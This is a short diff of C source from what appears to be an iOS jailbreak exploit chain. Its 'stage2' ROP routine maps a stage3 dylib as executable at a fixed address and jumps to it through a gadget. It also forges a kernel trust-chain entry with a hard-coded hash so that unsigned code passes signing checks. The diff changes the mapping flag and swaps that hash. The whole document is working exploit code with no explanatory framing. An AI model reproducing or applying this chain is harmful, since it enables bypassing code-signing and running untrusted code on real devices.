@@ -667,7 +667,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// map it at a fixed address
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG64("dylib_fd",5);
-	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_SHARED,0,offsets->stage3_fileoffset,0,0);
 	// jump
 	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
 
@@ -827,7 +827,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 1;
-	hash_t my_dylib_hash = {0x37,0xc1,0xf5,0xbd,0x2e,0xb8,0xdc,0xee,0x9b,0x29,0x7a,0xca,0xec,0x8e,0x5e,0x8d,0xc7,0xc9,0x88,0x2f};
+	hash_t my_dylib_hash = {0x84,0xb7,0x41,0x9a,0x1a,0x7c,0x19,0xbc,0x0f,0x12,0x98,0x63,0x33,0xd9,0x77,0x0f,0x54,0xfe,0xea,0x9c};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
@@ -1307,7 +1307,7 @@ _STRUCT_ARM_THREAD_STATE64
 	// map it at a fixed address
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG64("dylib_fd",5);
-	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_SHARED,0,offsets->stage3_fileoffset,0,0);
 	// jump
 	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
 
